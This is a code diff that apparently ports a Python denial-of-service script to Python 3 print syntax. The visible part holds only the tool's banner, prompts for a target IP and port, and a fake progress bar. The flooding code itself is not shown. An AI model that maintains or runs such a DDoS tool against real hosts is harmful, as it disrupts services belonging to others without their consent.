@@ -32,11 +32,11 @@ os.system("clear")
 os.system("figlet DDos Attack")
 os.system("clear")
 print
-print " ____  ____                 _   _   _             _"
-print "|  _ \\|  _ \\  ___  ___     / \\ | |_| |_ __ _  ___| | __"
-print "| | | | | | |/ _ \\/ __|   / _ \\| __| __/ _' |/ __| |/ /"
-print "| |_| | |_| | (_) \\__ \\  / ___ \\ |_| || (_| | (__|   <"
-print "|____/|____/ \\___/|___/ /_/   \\_\\__|\\__\\__,_|\\___|_|\\_\\"
+print (" ____  ____                 _   _   _             _")
+print ("|  _ \\|  _ \\  ___  ___     / \\ | |_| |_ __ _  ___| | __")
+print ("| | | | | | |/ _ \\/ __|   / _ \\| __| __/ _' |/ __| |/ /")
+print ("| |_| | |_| | (_) \\__ \\  / ___ \\ |_| || (_| | (__|   <")
+print ("|____/|____/ \\___/|___/ /_/   \\_\\__|\\__\\__,_|\\___|_|\\_\\")
 print
 ip = raw_input("IP Target : ")
 port = input("Port       : ")
@@ -44,37 +44,37 @@ port = input("Port       : ")
 os.system("clear")
 os.system("figlet Attack Starting")
 os.system("clear")
-print "[                    ] 00%"
+print ("[                    ] 00%")
 time.sleep(1)
 os.system("clear")
-print "[==                  ] 10%"
+print ("[==                  ] 10%")
 time.sleep(0.2)
 os.system("clear")
-print "[====                ] 20%"
+print ("[====                ] 20%")
 time.sleep(0.2)
 os.system("clear")
-print "[======              ] 30%"
+print ("[======              ] 30%")
 time.sleep(0.2)
 os.system("clear")
-print "[========            ] 40%"
+print ("[========            ] 40%")
 time.sleep(0.7)
 os.system("clear")
-print "[==========          ] 50%"
+print ("[==========          ] 50%")
 time.sleep(0.2)
 os.system("clear")
-print "[============        ] 60%"
+print ("[============        ] 60%")
 time.sleep(0.2)
 os.system("clear")
-print "[==============      ] 70%"
+print ("[==============      ] 70%")
 time.sleep(0.2)
 os.system("clear")
-print "[================    ] 80%"
+print ("[================    ] 80%")
 time.sleep(0.2)
 os.system("clear")
-print "[==================  ] 90%"
+print ("[==================  ] 90%")
 time.sleep(0.2)
 os.system("clear")
-print "[====================] 100%"
+print ("[====================] 100%")
 time.sleep(1)
 os.system("clear")
 sent = 0
